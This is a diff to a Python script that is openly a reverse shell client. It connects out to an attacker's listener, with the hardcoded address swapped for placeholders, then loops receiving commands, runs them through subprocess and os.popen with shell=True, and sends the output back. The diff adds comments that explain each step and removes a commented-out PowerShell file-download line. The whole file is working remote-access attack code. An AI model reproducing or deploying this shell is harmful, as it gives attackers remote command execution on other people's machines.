@@ -1,18 +1,25 @@
+# _Modules:
 from socket import *
 import os
 import subprocess
 
+# _Connecting to the listener
 client = socket(AF_INET, SOCK_STREAM)
-client.connect(("192.168.1.3",4444))
+client.connect(("YOUR_IP",LISTEN_PORT))
 
+# _infinite loop for sending & receiving data
 while True:
+    
+    # _Getting the current directory as the input on the attacker side
     location = os.popen('cd').read()
     result2 = " ".join(location) + ">>> "
     client.sendall(result2.encode())
-
+    
+    # _receiving the input
     data = client.recv(2048).decode()
     subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
+    # _Sending the command output
     if 'PowerShell' in data:
         client.sendall(data.encode())
 
@@ -36,6 +43,7 @@ while True:
 
     else:
         try:
+            # _If the command doesn't exist, it will send "Bad Command. If the command exists it will send the output of the command.
             subprocess.Popen(data, shell=False, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
             result = os.popen(data).read()
             client.sendall(result.encode())
@@ -43,5 +51,3 @@ while True:
             client.sendall("[-] Bad command".encode())
             continue
 
-
-#PowerShell (New-object system.net.webclient).downloadfile('https://cdn.istores.co.il/image/upload/if_ar_gt_2:1/c_fill,h_662,w_555/c_fill,h_662,w_555/if_else/c_fill,q_100,w_555/if_end/dpr_2/v1565347620/clients/16714/9844be013798da44193c7e46a6d9a1963661ceaa.jpg','C:\Users\shonb\OneDrive\Desktop\image.jpg');
